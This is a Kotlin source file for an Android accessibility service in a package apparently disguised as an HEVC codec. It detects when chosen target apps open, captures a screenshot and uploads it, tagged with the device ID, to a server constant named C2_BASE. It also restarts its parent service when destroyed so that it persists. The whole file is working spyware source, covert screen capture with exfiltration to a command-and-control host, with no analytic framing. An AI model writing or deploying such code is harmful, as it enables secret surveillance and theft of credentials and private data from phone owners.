package com.hevc.codec

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.net.HttpURLConnection

class AgentAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            windowContentTimeout = 500
        }
        Log.d("AgentA11y", "Connected - monitoring app switches")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val pkgName = event.packageName?.toString() ?: return

            val isWatched = AgentService.watchedApps.any {
                pkgName.contains(it, ignoreCase = true)
            }

            if (isWatched) {
                AgentService.isAppInForeground = true
                AgentService.foregroundAppName = pkgName
                Log.d("AgentA11y", "Watched app opened: $pkgName")

                // Trigger immediate first screenshot
                Thread {
                    try {
                        val reader = MainActivity.imageReader
                        if (reader != null) {
                            val bitmap = captureFromReader(reader)
                            if (bitmap != null) {
                                uploadToServer(bitmap)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("AgentA11y", "First shot failed", e)
                    }
                }.start()
            } else {
                AgentService.isAppInForeground = false
                AgentService.foregroundAppName = ""
            }
        }
    }

    private fun captureFromReader(reader: android.media.ImageReader): android.graphics.Bitmap? {
        val image = reader.acquireLatestImage() ?: return null
        val plane = image.planes[0]
        val buffer = plane.buffer
        val bitmap = android.graphics.Bitmap.createBitmap(
            image.width, image.height, android.graphics.Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        return bitmap
    }

    private fun uploadToServer(bitmap: android.graphics.Bitmap) {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
            val conn = java.net.URL("${AgentService.C2_BASE}/screenshot/$deviceId")
                .openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.use {
                bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 80, it)
            }
            conn.responseCode
        } catch (e: Exception) {
            Log.e("AgentA11y", "Upload failed", e)
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        try {
            val i = Intent(this, AgentService::class.java)
            i.action = "RESTART"
            startService(i)
        } catch (e: Exception) {}
        super.onDestroy()
    }
}